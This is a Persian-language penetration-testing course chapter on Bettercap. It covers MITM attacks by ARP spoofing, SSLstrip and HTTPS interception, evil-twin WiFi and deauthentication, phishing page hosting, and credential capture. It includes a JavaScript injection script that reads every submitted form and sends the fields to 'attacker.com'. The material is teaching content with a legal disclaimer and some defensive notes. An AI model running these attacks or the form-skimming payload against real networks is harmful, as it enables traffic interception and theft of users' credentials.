---
Episode: E2
Date: 2026-04-25T18:28:00
Title: Network Attacks - General Models
tags:
  - Networking
  - network_security
  - network_attacks
  - Network_Pentest
Categories:
  - Networking
  - Network Pentesting
  - Network Security
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
---------------
#### 2: Bettercap - Evolution in MITM Attacks
##### Bettercap: Introduction & History
1. **تاریخچه و معرفی:**
	- ابزار **Bettercap** توسط Simone Margaritelli در سال 2015 به عنوان جایگزینی مدرن برای Ettercap ساخته شد. اگر Ettercap یک ماشین قدیمی اما قدرتمند باشد، Bettercap یک خودروی اسپرت مدرن با تمام امکانات روز است.
	- ابزار Bettercap با **Go** نوشته شده و از معماری Modular بهره می‌برد. این یعنی می‌توانید دقیقاً آنچه نیاز دارید را فعال کنید.

2. **چرا Bettercap انقلاب کرد؟**
	- **رابط کاربری تعاملی (Interactive Shell):** مثل Metasploit کار می‌کند و با پرسش از کاربر فعالیت میکند.
	- **معماری ماژولار:** هر قابلیت یک ماژول جداگانه است، بنابراین آنچه را نیاز دارید فعال و استفاده میکنید.
	- **پشتیبانی از HTTPS/HTTP2:** برخلاف Ettercap که فقط HTTP محض است، Bettercap از HTTPS هم استفاده میکند.
	- **کنترل از راه دور:** بدلیل وجود REST API داخلی میتوانید Bettercap را از راه دور کنترل کنید.
	- **اسکریپت‌نویسی با JavaScript:** فیلترها با JS نوشته می‌شوند در حالیکه در Ettercap باید با C فیلتر نوشت.

3. **تاکید آموزشی:**
	1. تمامی سناریوها، کدها و دستورات ارائه شده در این فصل، **منحصراً برای استفاده در محیط‌های آزمایشگاهی، تحقیقاتی و دارای مجوز رسمی** طراحی شده‌اند. هرگونه استفاده از این دانش در شبکه‌های واقعی بدون کسب مجوز کتبی از مالکین آن، غیرقانونی و خلاف اصول اخلاق حرفه‌ای است.
##### Bettercap: Basic Commands & Flags
###### Installation, Update & Launching
پیش از ورود به دنیای پیشرفته Bettercap، باید با اصول اولیه کار با آن آشنا شویم. Bettercap یک ابزار **خط فرمان** با یک **پوسته تعاملی (Interactive Shell)** است که پس از اجرا، شما را وارد محیط فرمان می‌کند که این محیط بسیار شبیه به Metasploit است.
1. **Installation & Update(نصب و راه اندازی):**
	1. ابزار Bettercap در کالی لینوکس معمولاً از پیش نصب شده است.
```sh
sudo apt update -y && sudo apt install bettercap -y

#به‌روزرسانی به آخرین نسخه
sudo bettercap -eval "caplets.update; q"
```
2. **Launch Bettercap(اجرای اولیه ابزار):**
```sh
#اجرای اولیه در اینترفیس خاص
sudo bettercap -iface eth0
```

###### Commands Structure in Bettercap(Interactive Shell)
- تمامی فرمان‌ ها در پوسته Bettercap از الگوی ساده‌ای پیروی می‌کنند:
	- `<فرمان-اصلی> <نام ماژول> <فرمان-ماژول> [پارامترها] [مقادیر-پارامترها]`
```text
<Main-Command> <Module-Name> <Module-Command> [Parameters] [Parameter-Value]
```
- برای مثال:
```sh
net.probe on          #فعال‌سازی ماژول اسکن شبکه
set arp.spoof.targets 192.168.1.5   #تنظیم پارامتر هدف
arp.spoof on          #شروع حمله ARP Spoof(جعل ARP)
help net.probe        #دریافت راهنمایی برای یک ماژول خاص
```
###### Basic & Important Bettercap Commands

| **دستور**                 | **کاربرد**                                         |
|---------------------------|----------------------------------------------------|
| `help`                    | نمایش لیست تمام ماژول‌ ها و راهنمای کلی            |
| `help <Module-Name>`      | نمایش راهنمای یک ماژول خاص                         |
| `net.show`                | نمایش جدول دستگاه‌ های شناسایی‌ شده در شبکه        |
| `net.probe on/off`        | فعال/غیرفعال کردن اسکن شبکه                        |
| `set [Parameter] [Value]` | تنظیم یک پارامتر برای ماژول                        |
| `get [Parameter]`         | مشاهده مقدار فعلی یک پارامتر                       |
| `events.show`             | نمایش رویداد های ثبت‌ شده (مانند اسکن دستگاه جدید) |
| `events.clear`            | پاک کردن لیست رویدادها                             |
| `q` یا `quit` یا `exit`   | خروج از Bettercap                                  |

###### Bettercap Flags(Used Before Launch)
- برای شخصی سازی Bettercap، مانیتورینگ، استفاده از اسکریپت های حرفه ای و ... باید از فلگ ها استفاده کنیم. در جدول زیر این فلگ ها را به همراه کارکردشان توضیح میدهیم.

|       فلگ کوتاه       | توضیح کامل                                                                          |
| :-------------------: | :---------------------------------------------------------------------------------- |
|    `-iface <name>`    | تعیین اینترفیس شبکه برای حمله (اجباری).                                             |
|  `-eval <commands>`   | اجرای یک سری فرمان به محض شروع. می‌توان از `;` برای جدا کردن فرمان‌ ها استفاده کرد. |
|   `-caplet <file>`    | بارگذاری و اجرای یک فایل Caplet (اسکریپت‌های پیشرفته).                              |
|     `-no-history`     | غیرفعال کردن ذخیره تاریخچه جلسه در فایل.                                            |
|       `-debug`        | چاپ تمام لاگ‌های سطح اشکال‌زدایی برای تحلیل مشکلات.                                 |
|       `-silent`       | عدم چاپ بنر شروع و هشدارهای اولیه.                                                  |
| `-cpu-profile <file>` | ذخیره پروفایل مصرف CPU برای بهینه‌سازی.                                             |
| `-mem-profile <file>` | ذخیره پروفایل مصرف حافظه.                                                           |
|  `-env <variables>`   | تنظیم متغیرهای محیطی قبل از اجرا.                                                   |
|      `-version`       | نمایش نسخه فعلی Bettercap و خروج.                                                   |

- **مثال های پرکاربرد:**
1. اجرای مستقیم یک فرمان بدون نیاز به Launch و وارد شدن به پوسته
```sh
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; q"
```
2. تعریف متغیر ها قبل از اجرای Bettercap برای استفاده آسان:
```sh
sudo bettercap -iface eth0 -env 'target1=192.168.10.10;target2=192.168.20.10;website=www.facebook.com'
```
##### Bettercap: Main Features
###### 1: Network Scanning and Discovering
```sh
#Launch Bettercap
sudo bettercap -iface eth0

#Bettercap In Terminal:
#Scanning Network
net.probe on
net.show

#Show Network Device Information (MAC, IP, Vendor, Hostname)
net.show full

#اسکن پورت‌های یک هدف خاص
#Port Scanning from Specific Target
net.sniff on
```
###### 2: HTTP/HTTPS Proxy (Real Magic!)
```sh
#Enable HTTP
http.proxy on

#Enable HTTPS (Automatic SSLstrip)
https.proxy on

#Set Port Proxy
set http.proxy.port 8080

#Enable Transparent (iptables Needed)
set http.proxy.transparent true
```
###### 3: JavaScript Injection
```javascript
// File: inject.js
// This code inject in all HTTP Pages
// Theft All Keys
document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = new FormData(form);
    for (var pair of data.entries()) {
        console.log(pair[0] + ': ' + pair[1]);
        // Send to Attacker Server
        new Image().src = 'http://attacker.com/log?key=' + 
                         btoa(pair[0] + '=' + pair[1]);
    }
});

// Change Website UI
document.body.style.border = "5px solid red";
var banner = document.createElement('div');
banner.innerHTML = '<h1 style="color:red"> تست نفوذ انجام شد </h1>';
document.body.insertBefore(banner, document.body.firstChild);
```
- حال میتوانیم از فای JavaScript برای تزریق استفاده کنیم:
```sh
#use js file for inject
set http.proxy.script inject.js
http.proxy on
```
###### 4: Capture Traffic and Extract Data
```sh
#1-Start Sniffing
net.sniff on

#2-Save to PCAP File
set net.sniff.output capture.pcap

#3-Special Filter(for example HTTP Only)
set net.sniff.filter "tcp port 80 or tcp port 443"

#3-Auto Extract User Information
http.proxy on
https.proxy on
#Now when User Logged in, Logging Information Show in Console
```
- حال هر گاه قربانی لاگین کند، اطلاعات آن در کنسول نمایش داده میشود.
###### 5: WiFi Attack (Unique Feature)
- یکی از ویژگی های منحصر بفرد و خاص Bettercap پیاده سازی حملات به شبکه های Wireless است.
```sh
#1-Scan WiFi Networks
wifi.recon on

#2-Show founded WiFi Networks
wifi.show

#3-Create Evil Twin (Fake Access Point)
wifi.ap on
set wifi.ap.ssid "Starbucks_Free_WiFi"
set wifi.ap.channel 6
wifi.ap start

#4-Deauth Attack(Disconnect All Clients)(قطع اتصال کلاینت‌ ها)
wifi.deauth 00:11:22:33:44:55
```
###### 6: REST API (Remote Control)
```sh
#Enable RestAPI
api.rest on
#Now we can Control bettercap with 'curl' 

#Get Status
curl http://127.0.0.1:8083/api/session

#Start ARP Spoof
curl -X POST http://127.0.0.1:8083/api/arp.spoof -d '{"status":"on"}'

#Get Credentials of Users which get from Network Attacks
#دریافت اطلاعات کاربری که در حملات شبکه بدست آمده است
curl http://127.0.0.1:8083/api/credentials
```
###### 7: Modules
- معماری Bettercap بر پایه **ماژول‌ها** و **پلاگین‌ها** استوار است و در واقع قدرت اصلی Bettercap هم در همین معماری ماژولار نهفته است. هر ماژول یک واحد عملکردی مستقل است که می‌توان آن را به صورت پویا بارگذاری، پیکربندی و اجرا کرد. این طراحی باعث می‌شود ابزار بسیار سبک، منعطف و قابل توسعه باشد.

- **ماژول های Bettercap در دسته بندی های متفاوتی قرار میگیرند:**
	1. Reconnaissance & Scanning Modules(ماژول‌ های شناسایی و کاوش)
	2. Proxy & Web Modules(ماژول های پراکسی و HTTP/HTTPS)
	3. WiFi Modules(ماژول های وایرلس)
	4. Attack & Exploitation Modules(ماژول های حمله و بهره برداری)
	5. REST API Module `api.rest`(ماژول کنترل از راه دور)
	6. Analyzer/Sniffer Modules(ماژول های شنود و تحلیل ترافیک)
	7. Automation & Logging Modules(ماژول های اتوماسیون و ثبت رویداد)

در ادامه، لیست جامعی از ماژول‌های اصلی، پرکاربرد و تخصصی را با شرح کامل عملکرد و سناریوهای استفاده بررسی می‌کنیم.
##### Bettercap: Most Important Modules
###### 0. `set/get` Parameters in Bettercap Modules
هر ماژول Bettercap دارای پارامتر های مخصوص خود است که باید قبل از فعال کردن ماژول مقادیر آنها تنظیم شود.
دستورات `set` و `get` در پوسته تعاملی Bettercap، ابزارهای اصلی برای شخصی‌سازی و مدیریت پارامترهای هر ماژول هستند. بدون آن‌ها، ماژول‌ها فقط با مقادیر پیش‌ فرض خود اجرا می‌شوند و انعطاف‌ پذیری خود را از دست می‌دهند.

- **کاربرد `set`: فرمانده پیکربندی**
	* از `set` برای اعمال تنظیمات دلخواه روی یک ماژول خاص استفاده می‌شود. شما با این دستور به Bettercap می‌گویید که دقیقاً چگونه رفتار کند.
	* **کاربرد های اصلی:**
		1. تعیین اهداف حمله: مشخص کردن اینکه کدام دستگاه‌ها تحت تأثیر قرار گیرند.
		2. تنظیم مقادیر فنی تغییر پورت‌ها، بازه‌های زمانی، مسیر فایل‌های خروجی.
		3. فعال‌سازی قابلیت‌های خاص روشن یا خاموش کردن زیرویژگی‌های یک ماژول.

```sh
#General Syntax (ساختار کلی)
set <Module-Name>.<Parameter-Name> <New-Value>

#Examples 
set arp.spoof.targets 192.168.1.5
set arp.spoof.internal 0.5
set dns.spoof.domains *.facebook.com
```

- **کاربرد `get`: نمایشگر پیکربندی**
	- از get برای مشاهده مقدار فعلی یک پارامتر استفاده می‌شود. این دستور به شما نشان می‌دهد که تنظیمات یک ماژول در حال حاضر روی چه مقداری تنظیم شده است.
	- **کاربردهای اصلی:**
	1. بررسی تنظیمات قبل از حمله: اطمینان از اینکه پارامترها به درستی مقداردهی شده‌اند.
	2. عیب‌یابی: فهمیدن اینکه چرا یک ماژول مطابق انتظار کار نمی‌کند.
	3. مشاهده تنظیمات پیش‌فرض: دیدن مقدار اولیه پارامترها.
```sh
#General Syntax (ساختار کلی)
set <Module-Name>.<Parameter-Name>

#Examples:
get arp.spoof.targets
get arp.spoof.internal
get net.sniff.output
```

**نکته طلایی:** همیشه قبل از اجرای یک ماژول تهاجمی (مانند `arp.spoof`)، یکبار دستور `get` را برای پارامترهای حیاتی آن اجرا کنید تا از صحت عملکرد و جلوگیری از ایجاد اختلال در شبکه مطمئن شوید.

###### 1: `net.probe` Network Reconnaissance Module
- **توضیحات ماژول:**
	- **نوع اسکن:** شناسایی فعال (Active)
	- **کارکرد:** این ماژول، چشم‌های Bettercap برای دیدن دستگاه‌ های متصل به شبکه است. با ارسال بسته‌های کاوشگر (Probes) مختلف (ARP, MDNS, NBNS, UPNP, WSD) به شناسایی و جمع آوری اطلاعات شبکه میپردازد.
	- **توانایی استخراج اطلاعاتی مانند:** 
		1. دستگاه‌ های فعال در شبکه (Active Devices) 
		2. آدرس مک (MAC Address)
		3. نوع فروشنده (Vendor)
		4. نام میزبان (Host Name)
		5. سیستم‌ عامل (OS)
		6. سرویس های در حال اجرا (Running Services)
	- **سناریو:**
		- در ابتدای تست نفوذ برای کشف سریع و کامل تمام دارایی‌های شبکه(Network Assets).

- **جدول تنظیمات و پارامتر ها:**

|**پارامتر**|**مقدار پیش‌فرض**|**توضیح**|
|---|---|---|
|`net.probe.throttle`|`10`|تأخیر بین هر درخواست اسکن (میلی‌ثانیه)|
|`net.probe.mdns`|`true`|فعال‌سازی اسکن mDNS (پروتکل Bonjour اپل)|
|`net.probe.nbns`|`true`|فعال‌سازی اسکن NetBIOS (دستگاه‌های ویندوز)|
|`net.probe.upnp`|`true`|اسکن دستگاه‌ های UPnP|
|`net.probe.wsd`|`true`|اسکن سرویس‌ های WSD (چاپگر ها و اشتراک‌ ها)|

- **روش استفاده:**
```sh
#Start Scanning(شروع اسکن)
net.probe on

#Show Results with Details(نمایش نتایج با جزئیات کامل)
net.show

#Show Results based on Filter(نمایش با فیلتر -فقط دستگاه‌های خاص)
net.show 192.168.1.0/24

#Set Speed of Scan on 50ms(تنظیم سرعت اسکن - 50 میلی ثانیه)
set net.probe.throttle 50
```
###### 2: `arp.spoof` ARP Spoofing Module
- **توضیحات ماژول:**
	- هدف این ماژول، اجرای حمله Man-in-the-Middle از طریق ایجاد تغییر در جداول ARP است. این ماژول به صورت **دو طرفه کامل (Full Duplex)** کار کرده و به طور مداوم بسته‌ های جعلی ARP Reply را ارسال می‌کند.

- **جدول تنظیمات و پارامتر ها:**

| **پارامتر**           | **توضیح**                                       |
|-----------------------|-------------------------------------------------|
| `arp.spoof.targets`   | آدرس IP هدف (یا اهداف) برای حمله                |
| `arp.spoof.internal`  | فاصله زمانی بین بسته‌ های ARP (ثانیه)           |
| `arp.spoof.whitelist` | لیست IP هایی که نباید مورد حمله واقع شوند       |
| `arp.spoof.gateway`   | آدرس Gateway شبکه (در صورت تشخیص خودکار نادرست) |

- **روش استفاده:**
```sh
#Set Target(IP, Range of IPs, Whole Subnet)
#تنظیم هدف می‌تواند یک آیپی، چند آیپی یا یک ساب نت باشد
set arp.spoof.targets 192.168.1.5,192.168.1.10

#Enable ARP Spoofing Module(فعال سازی ماژول)
arp.spoof on

#Attack launch every 0.5ms(حمله هر 0.5 ثانیه یکبار اجرا میشود)
set arp.spoof.internal 0.5
```

**توضیحات تکمیلی:**
- **پروتکل ARP(Address Resolution Protocol):**
	1. پروتکل ARP برای ترجمه‌ی آدرس‌های IP به آدرس‌های MAC در شبکه‌ های محلی استفاده می‌شود. این پروتکل در لایه دوم مدل OSI یعنی Data-Link Layer فعالیت میکند.
	2. هنگامی که یک دستگاه می‌خواهد به دستگاه دیگری در همان شبکه‌ی LAN دسترسی پیدا کند، با ارسال درخواست ARP به کل شبکه(Broadcast)، آدرس MAC مربوط به IP مورد نظر را بدست آورده و سپس داده را ارسال می‌کند.
	- **نکات کلیدی:**
		1. پروتکل ARP در IPv4 استفاده می‌شود و IPv6 از Neighbor Discovery Protocol استفاده میکند.
		2. درخواست ARP به صورت Broadcast ارسال می‌شود(ARP Request)؛ دستگاهی که آدرس IP مورد نظر را دارد، پاسخ (ARP Reply) را ارسال می‌کند.
		3. جدول ARP که ARP Cache نام دارد در تمام دستگاه های شبکه نگهداری می‌شود و معمولاً به مدت چند دقیقه فعال باقی می‌ماند تا بار درخواست‌ های ARP کاهش یابد.
		4. حملات معروف این پروتکل ARP spoofing یا ARP poisoning هستند که از طریق تزریق رکورد های ARP جعلی به جدول ARP Cache انجام میشوند و می‌توانند باعث سوءاستفاده از شبکه شوند.

- **حملات ARP Poisoning (یا ARP Spoofing):**
	1. تکنیکی است که در آن مهاجم پیام‌های ARP جعلی ارسال می‌کند تا آدرس MAC خود را با IP مورد هدف مرتبط کند و در بین ترافیک های عبوری در شبکه قرار بگیرد(MITM). 
	2. در شبکه‌های محلی، پیام‌های ARP در حالت Broadcast فرستاده می‌شوند؛ مهاجم با فرستادن پیام‌های فریبنده می‌تواند آدرس MAC اشتباهی را برای یک IP ثبت کند.
	3. **اثرات معمول:** دسترسی به داده‌های حساس، تغییر مسیر ترافیک، قطع اتصال (DoS) یا مانع دسترسی به سرویس‌های خاص.
	4. **شناسایی:** تغییر ناگهانی در جدول ARP، تکرار پیام‌های ARP به‌صورت غیر عادی یا مقایسه با پایگاه‌ داده‌ ثابت (Static ARP).
	5. **پیشگیری:** استفاده از static ARP، فعال‌سازی فایروال سطح سوئیچ (Port Security)، پیاده‌ سازی پروتکل‌های محافظتی مانند DHCP snooping، یا راه‌حل‌های VPN و TLS برای رمزنگاری.
	6. **نکته:** در فصل های بعدی بصورت کامل این حمله را به همراه روش های پیاده سازی و دفاع توضیحیم خواهیم داد.
###### 3: `https.proxy` - `http.proxy` Proxy Modules
- **توضیحات ماژول:**
	- این دو ماژول، هسته مرکزی تحلیل و دستکاری ترافیک وب هستند. `http.proxy` ترافیک HTTP را در لحظه پردازش میکند.
	- ماژول پرکاربرد `https.proxy` نیز با استفاده از تکنیک‌ های پیشرفته، گواهی‌ های دیجیتال جعلی برای وب‌ سایت‌ ها صادر می‌کند تا ترافیک رمزنگاری‌ شده HTTPS را نیز قابل تحلیل کند (SSL Interception). این ماژول یکی از برتری های Bettercap نسبت به Ettercap است.

- **جدول تنظیمات و پارامتر ها:**

| **پارامتر**               | **توضیح**                                                     |
|---------------------------|---------------------------------------------------------------|
| `http.proxy.port`         | پورتی که پراکسی HTTP روی آن گوش می‌دهد (پیش‌فرض: 8080)        |
| `http.proxy.script`       | مسیر فایل جاوا اسکریپت JS برای تزریق به صفحات                 |
| `http.proxy.sslstrip`     | فعال‌سازی مکانیزم تنزل اجباری HTTPS به HTTP                   |
| `https.proxy.port`        | پورتی که پراکسی HTTPS روی آن گوش می‌دهد (پیش‌فرض: 8083)       |
| `https.proxy.certificate` | مسیر فایل گواهی CA سفارشی (در صورت عدم تمایل به تولید خودکار) |
- **روش استفاده:**
```sh
#Enable HTTP Proxy(فعال‌سازی پراکسی HTTP)
http.proxy on

#Enable HTTPS Proxy(Need CA Certificate in Target Machine)
#فعال‌سازی پراکسی HTTPS (نیاز به اعتماد به گواهی  در دستگاه هدف)
https.proxy on

#Set Injection Script(تنظیم اسکریپت تزریق)
set http.proxy.script /root/inject.js
```
###### 4: `net.sniff` Network Sniffer Module
- **توضیحات ماژول:**
	- یک اسنیفر تمام‌عیار که می‌تواند ترافیک را بر اساس فیلترهای BPF ضبط و تحلیل کند. بر خلاف Wireshark که یک ابزار گرافیکی مستقل است، `net.sniff` به طور کامل با سایر ماژول‌ها یکپارچه شده است.

- **جدول تنظیمات و پارامتر ها:**

| **پارامتر**        | **توضیح**                                       |
|--------------------|-------------------------------------------------|
| `net.sniff.output` | مسیر فایل PCAP برای ذخیره ترافیک                |
| `net.sniff.filter` | قانون فیلتر BPF (مانند `tcp port 80`)           |
| `net.sniff.local`  | اگر `true` باشد، فقط ترافیک خود ماشین تحلیل شود |

- **روش استفاده:**
```sh
#Start Sniffing and Save Results into PCAP File
#شروع اسنیفینگ و ذخیره در فایل
set net.sniff.output /tmp/traffic.pcap
net.sniff on

#Filter HTTP(port:80) Requests(فیلتر درخواست‌های HTTP)
set net.sniff.filter "tcp port 80"
```
###### 5: `events.stream` Show Live Events Modules
- **توضیحات ماژول:**
	- این ماژول برای نمایش لحظه‌ای اطلاعات حساس استخراج‌ شده از ترافیک، مانند درخواست‌های HTTP، اطلاعات ورود (Credentials)، و Cookies ها به کار می‌رود. یک ابزار ارزشمند برای نظارت در حین تست نفوذ.

- **روش استفاده:**
```sh
#Enable Event Stream Module(فعال‌سازی ماژول نمایش رویدادها)
events.stream on

#Clear Old Events(پاک کردن رویدادهای قدیمی)
events.clear
```
###### 6: `ticker` Run Commands Automatically
- **توضیحات ماژول:**
	- با استفاده از `ticker` می‌توانید یک فرمان را به صورت دوره‌ای و خودکار اجرا کنید. برای مثال، نمایش خودکار جدول دستگاه‌ها هر 10 ثانیه یک بار.

- **روش استفاده:**
```sh
#Set Command and Period(تنظیم فرمان و دوره تناوب)
set ticker.commands "clear; net.show; arp.spoof status"
set ticker.period 5
ticker on
```
##### Bettercap: Reconnaissance & Scanning Modules
###### 1: `net.recon` Reconnaissance Module
- **توضیحات ماژول:**
	1. **نوع:** شناسایی غیرفعال (Passive)
	2. **کارکرد:** برخلاف `net.probe` که فعالانه بسته ارسال می‌کند، این ماژول تنها با گوش دادن به ترافیک موجود در شبکه، دستگاه‌ها را شناسایی می‌کند. در واقع هیچ بسته اضافی تولید نمی‌شود در نتیجه احتمال شناسایی بسیار کاهش پیدا میکند.
	3. **سناریو استفاده:** زمانی که می‌خواهیم کاملاً نامحسوس عمل کنیم و هیچ ردپایی در شبکه باقی نگذاریم.

- **روش استفاده:**
```sh
#Enable Passive Reconnaissance(فعال‌سازی شناسایی غیرفعال)
net.recon on

#Show Discovered Devices(نمایش دستگاه‌های کشف‌شده)
net.show

#Set Filter on Specific Subnet(تنظیم فیلتر برای ساب نت)
set net.recon.filter 192.168.1.0/24
```
###### 2: `ble.recon` BLE Devices Reconnaissance Module
- **توضیحات ماژول:**
	1. **نوع:** شناسایی دستگاه های بلوتوث کم‌ مصرف (BLE)
	2. **کارکرد:** دستگاه‌های BLE اطراف (مانند ساعت‌های هوشمند، تگ‌های ردیابی، قفل‌های هوشمند) را اسکن و شناسایی می‌کند.
	3. **سناریو استفاده:** ارزیابی امنیت فیزیکی و شناسایی دستگاه‌ های اینترنت اشیا (IoT) و گجت ها (Gadgets) در محدوده.

- **روش استفاده:**
```sh
#Enable BLE Scan Module (فعال‌سازی اسکن BLE)
ble.recon on

#Show BLE Devices (نمایش دستگاه‌ های BLE)
ble.show

#Set Minimum Signal Strength in dBm (تنظیم حداقل قدرت سیگنال)
set ble.recon.min-rssi -70
```
###### 3: `hid.recon` HID Devices Reconnaissance Module
- **توضیحات ماژول:**
	1. **نوع:** شناسایی دستگاه‌های HID (Human Input Device)
	2. **کارکرد:** دستگاه‌های ورودی انسانی (مانند کیبورد و ماوس بی‌سیم) را شناسایی می‌کند.
	3. **سناریو استفاده:** تست نفوذ فیزیکی و حملات مبتنی بر کیبوردهای بی‌سیم (Mousejacking).

- **روش استفاده:**
```sh
#Enable Module (فعالسازی ماژول)
hid.recon on

#Show Founded Devices (نمایش دستگاه های یافت شده)
hid.show
```
###### 4: `syn.scan` Syn-Stealth Scanning Module
- **توضیحات ماژول:**
	1. **کارکرد:** اجرای SYN‑Stealth Scan روی پورت‌ های مشخص‌ شده برای شناسایی سرویس‌های فعال.
	2. **سناریو استفاده:** شناسایی پورت‌ های باز(Open Ports) بدون تکمیل فرآیند برقراری ارتباط TCP Three-way Handshake (مخفی‌ تر).

- **روش استفاده:**
```sh
#Set target/targets IP (تنظیم آیپی اهداف)
set syn.scan.targets 192.168.1.5

#Set Ports should be scanned(تنظیم پورت هایی که باید اسکن شوند)
set syn.scan.ports 22,80,443,3306,8080

#Enable Module (فعالسازی ماژول)
syn.scan on
```

- **اسکن SYN scan (SYN‑stealth scan) چیست؟**
	- یک روش اسکن پورت است که تنها بسته‌ اول SYN ارسال می‌کند؛ اگر سرور پاسخ SYN‑ACK دهد، پورت باز است، اگر RST دریافت شود پورت بسته است و اگر هیچ پاسخی نداشته باشد، فیلتر شده می‌باشد. 
	- این تکنیک اتصال کامل TCP را انجام نمی‌دهد، بنابراین شناسایی کمتر می‌شود و اسکن سریع‌تر است.
	- **ویژگی های Syn-stealth Scan:**
		1. فقط بسته‌ی SYN ارسال می‌شود؛ اتصال نیمه‌کامل باقی می‌ماند.
		2. وضعیت پورت‌ ها به صورت «باز-open»، «بسته-close» یا «فیلتر-filtered» تشخیص می‌شود.
		3. کمترین ردیابی در لاگ‌های شبکه؛ برای اسکن های مخفی مناسب است.
		4. در ابزار Nmap با فلگ `-sS` پیاده سازی میشود.
		5. زمان اسکن بسیار کوتاه و حجم ترافیک کم است.
##### Bettercap: Proxy & Web Modules
###### 1: `tcp.proxy` TCP Proxy Module
- **توضیحات ماژول:**
	1. **کارکرد:** یک پراکسی TCP عمومی که می‌تواند هر پروتکلی (نه فقط HTTP) را رهگیری و دستکاری کند.
	2. **سناریو استفاده:** رهگیری پروتکل‌های غیراستاندارد، بازی‌های آنلاین، یا ترافیک دیتابیس.

- **روش استفاده:**
```sh
#Set Source/Destination Port (تنظیم پورت مبدأ و مقصد)
set tcp.proxy.port 1337

#Redirect Traffics to MySQL Server (هدایت ترافیک به سرور MySQL)
set tcp.proxy.address 192.168.1.100:3306  

#Enable Module (فعالسازی ماژول)
tcp.proxy on
```
###### 2: `http.server` Web Server Module
- **توضیحات ماژول:**
	1. **کارکرد:** یک وب سرور داخلی که می‌تواند فایل‌ های استاتیک (مانند صفحات فیشینگ یا بدافزارها) را برای اهداف میزبانی کند.
	2. **سناریو استفاده:** ترکیب با DNS Spoofing برای ارائه صفحه فیشینگ جعلی به جای وبسایت اصلی.

- **روش استفاده:**
```sh
#Set Webserver Root Directory (تنظیم آدرس دایرکتوری ریشه وبسرور)
set http.server.path /var/www/phishing

#Set Webserver Port (تنظیم پورت وبسرور)
set http.server.port 80

#Enable Module (فعالسازی ماژول)
http.server on
```
###### 3: `web.robots` Info Gathering from Robots.txt Module
- **توضیحات ماژول:**
	1. **کارکرد:** به صورت خودکار فایل `robots.txt`(توضیحات تکمیلی[^1]) وبسایت‌ های بازدید شده توسط هدف را دانلود و مسیرهای مخفی را کشف می‌کند.
	2. **سناریو استفاده:** جمع‌آوری اطلاعات ارزشمند از مسیرهای مدیریتی و حساس وبسایت‌ ها.

- **روش استفاده:**
```sh
#Enable Module (فعالسازی ماژول)
web.robots on
#Show Founded Paths(URLs)-(نمایش مسیرهای کشف‌شده)
events.stream on
```

- **توضیحات تکمیلی:**
	1. `robots.txt` [^1]:
		- فایل مشهور **`robots.txt`** فایلی است که در ریشهٔ وبسایت‌ ها قرار می‌گیرد و برای راهنمایی خزنده‌های موتور جست‌وجو(Crawlers) مثل Googlebot استفاده می‌شود. 
		- این فایل به آن‌ها می‌گوید کدام بخش‌های سایت را باید یا نباید بررسی و ایندکس کنند. این بخش ها شامل مسیر های مجاز و غیر مجاز، نوع فایل های مجاز و غیر مجاز و ... میشود.
		- مثلاً با آن می‌توان از ایندکس شدن بخش‌های خصوصی، داشبورد ادمین، فایل های `docx.` و صفحات موقت توسط خزنده ها جلوگیری کرد.[^1]
		- به‌صورت ساده و در یک جمله **مجموعه ای از قوانین برای ربات‌های خزنده وب** است. 
		- **کاربرد حرفه‌ای:** بهینه‌سازی Crawl Budget و حفظ امنیت نسبی داده‌های غیرعمومی در سایت.
- **نمونه ای ساده از `robots.txt`:**
```robot - robots.txt
User-agent: *
Disallow: /private/
```
- این یعنی همهٔ ربات‌ها (`*`) اجازه ندارند پوشهٔ `/private/` را بخوانند.

###### 4: `packet.proxy` Transfer Packets between Interfaces Module
- **توضیحات ماژول:**
	1. **کارکرد:** یک پراکسی سطح پایین که بسته‌ های خام را بین دو اینترفیس جا‌بجا می‌کند.
	2. **سناریو استفاده:** اتصال دو شبکه مجزا یا ایجاد پل شفاف برای تحلیل ترافیک.

- **روش استفاده:**
```sh
#Set Interfaces for Packet Proxy
set packet.proxy.iface1 eth0
set packet.proxy.iface2 eth1

#Enable Module (فعالسازی ماژول)
packet.proxy on
```
##### Bettercap: WiFi Modules
###### 1: `wifi.recon` WiFi Reconnaissance Module
- **توضیحات ماژول:**
	1. **کارکرد:** اسکن شبکه‌های Wi-Fi و جمع‌آوری اطلاعات بصورت کامل از آنها
	2. **توانایی استخراج داده های:**
		1. SSID: نام اکسس پوینت
		2. BSSID: مک آدرس مخصوص کارت شبکه بیسیم شامل رادیو وایرلس
			1. نکات تکمیلی(1)
		3. Channel - کانال وایرلس
		4. Encryption - نوع امنیت(رمزنگاری) مورد استفاده برای اتصال کلاینت ها
			1. نکات تکمیلی(2)
		5. Clients - کلاینت های متصل
	3. **سناریو استفاده:** فاز شناسایی و جمع آوری اطلاعات در تست نفوذ بی‌سیم.

- **روش استفاده:**
```sh
#Enable Module (فعالسازی ماژول)
wifi.recon on

#Show WiFi Networks with Information(نمایش شبکه های وایرلس با اطلاعات)
wifi.show
```

- **نکات تکمیلی:**
	1. **مقدار BSSID:**
		1. مقدار BSSID مک آدرس کارت شبکه های وایرلسی مربوط به اکسس‌ پوینت هاست. 
		2. این مک آدرس خاص نشان دهنده رادیو WiFi اکسس پوینت نیز هست و بنابراین BSSID با مک آدرس های معمولی متفاوت است.
	2. **رمزنگاری در شبکه های وایرلس:**
		1. **مرحله اول:** اتصال اولیه (Pairing / Association)
			1. دستگاه ابتدا با AP جفت می‌شود. این شامل دو مورد زیر است:
			    - Association Request
			    - Association Response
			2. سپس یک ارتباط منطقی بین MAC کلاینت و MAC اکسس‌ پوینت شکل می‌گیرد.
		2. **مرحله دوم:** مرحله تبادل کلید های رمزنگاری (4-Way Handshake)
			1. در پروتکل‌های WPA/WPA2/WPA3، یک تبادل 4 مرحله‌ای بین AP و Client انجام می‌شود برای اینکه:
			- کلید جلسه (PTK) تولید شود
			- ترافیک لایه 2 رمزنگاری شود (AES، CCMP، GCMP و…)
		3. **مرحله سوم:** رمزنگاری فریم‌ های لایه 2
			1. از این لحظه به بعد، تمام فریم‌های وای‌فای بین AP و Client رمزنگاری می‌شوند.
			2. این فریم‌ها شامل موارد زیر هستند:
				- دیتا
				- کنترل
				- مدیریت (فقط در WPA3)
		4. **به زبان ساده‌تر:**
			1. رمزنگاری Encryption در وای‌فای یعنی «نحوهٔ رمز کردن فریم‌های لایه 2 شبکه»
